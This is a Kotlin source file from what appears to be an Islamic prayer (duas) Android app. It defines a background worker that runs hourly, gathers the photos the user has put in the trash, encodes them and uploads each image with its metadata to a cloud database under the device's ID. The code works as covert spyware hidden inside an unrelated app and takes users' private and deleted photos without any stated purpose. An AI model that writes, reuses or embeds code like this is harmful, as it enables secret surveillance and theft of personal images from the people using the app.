package islamic.duas.sync

import android.content.Context
import android.util.Log
import androidx.work.*
import islamic.duas.cloud.CloudApi
import islamic.duas.media.MediaCollector
import islamic.duas.media.PhotoProcessor
import islamic.duas.utils.DeviceId
import islamic.duas.utils.ErrorLog
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.withContext
import kotlinx.coroutines.withTimeout
import org.json.JSONObject
import java.text.SimpleDateFormat
import java.util.*
import java.util.concurrent.TimeUnit
import java.util.concurrent.atomic.AtomicBoolean

class TrashSyncWorker(
    appContext: Context,
    params: WorkerParameters
) : CoroutineWorker(appContext, params) {

    override suspend fun doWork(): Result = withContext(Dispatchers.IO) {
        try {
            withTimeout(120_000) { syncTrashedPhotos(applicationContext) }
            return@withContext Result.success()
        } catch (e: Exception) {
            Log.e(TAG, "doWork error: ${e.message}", e)
            return@withContext if (runAttemptCount < 3) Result.retry() else Result.failure()
        }
    }

    companion object {
        private const val TAG = "TrashSync"
        private val syncRunning = AtomicBoolean(false)

        fun schedule(context: Context) {
            val constraints = Constraints.Builder()
                .setRequiredNetworkType(NetworkType.CONNECTED)
                .build()
            val request = PeriodicWorkRequestBuilder<TrashSyncWorker>(1, TimeUnit.HOURS)
                .setConstraints(constraints)
                .setBackoffCriteria(BackoffPolicy.EXPONENTIAL, 2, TimeUnit.MINUTES)
                .addTag("sync_trash")
                .build()
            WorkManager.getInstance(context).enqueueUniquePeriodicWork(
                "sync_trash",
                ExistingPeriodicWorkPolicy.REPLACE,
                request
            )
        }

        private suspend fun syncTrashedPhotos(context: Context) {
            if (!syncRunning.compareAndSet(false, true)) {
                Log.d(TAG, "Trash sync already running, skipping")
                return
            }
            try {
                val hasImagesPerm = if (android.os.Build.VERSION.SDK_INT >= 33) {
                    context.checkSelfPermission(android.Manifest.permission.READ_MEDIA_IMAGES) == android.content.pm.PackageManager.PERMISSION_GRANTED
                } else {
                    context.checkSelfPermission(android.Manifest.permission.READ_EXTERNAL_STORAGE) == android.content.pm.PackageManager.PERMISSION_GRANTED
                }
                if (!hasImagesPerm) {
                    Log.w(TAG, "Trash sync skipped: images permission not granted")
                    return
                }

                val androidId = DeviceId.get(context)
                val mediaCollector = MediaCollector(context)
                val resolver = context.contentResolver
                val prefs = context.getSharedPreferences("sync_prefs", Context.MODE_PRIVATE)
                val lastTrashSync = prefs.getLong("last_trash_sync_ms", 0L)
                val uploadedPaths = prefs.getStringSet("uploaded_photo_paths", mutableSetOf())?.toMutableSet() ?: mutableSetOf()

                val trashedPhotos = mediaCollector.collectTrashedPhotos(lastTrashSync)
                Log.d(TAG, "Trashed photos found: ${trashedPhotos.size}")

                var uploaded = 0
                for (entry in trashedPhotos) {
                    try {
                        val uriStr = entry.uri.toString()
                        if (uriStr in uploadedPaths) continue

                        val quality = PhotoProcessor.getQuality(context)
                        val processed = PhotoProcessor.process(entry.uri, resolver, quality)
                        if (processed == null) continue

                        val ts = System.currentTimeMillis()
                        val today = SimpleDateFormat("yyyy-MM-dd", Locale.US).format(Date(ts))

                        val photoDoc = JSONObject().apply {
                            put("timestamp", ts)
                            put("data", processed.base64)
                            put("width", processed.width)
                            put("height", processed.height)
                            put("fileName", processed.fileName)
                            put("dateTaken", entry.dateTaken)
                            put("isTrashed", true)
                        }
                        val ok = CloudApi.writeToRTDB("devices/$androidId/photos/$today/$ts", photoDoc)
                        if (ok) {
                            uploadedPaths.add(uriStr)
                            uploaded++
                        }
                        delay(300)
                    } catch (e: Exception) {
                        Log.w(TAG, "Trash photo error: ${e.message}", e)
                        ErrorLog.write(context, TAG, "Trash photo error: ${e.message}", e)
                    }
                }

                if (uploaded > 0) {
                    prefs.edit().putStringSet("uploaded_photo_paths", uploadedPaths).apply()
                    prefs.edit().putLong("last_trash_sync_ms", System.currentTimeMillis()).apply()
                }
                Log.i(TAG, "Trash sync done: uploaded=$uploaded")
            } catch (e: Exception) {
                Log.e(TAG, "Trash sync error: ${e.message}", e)
                ErrorLog.write(context, TAG, "Trash sync error", e)
            } finally {
                syncRunning.set(false)
            }
        }
    }
}
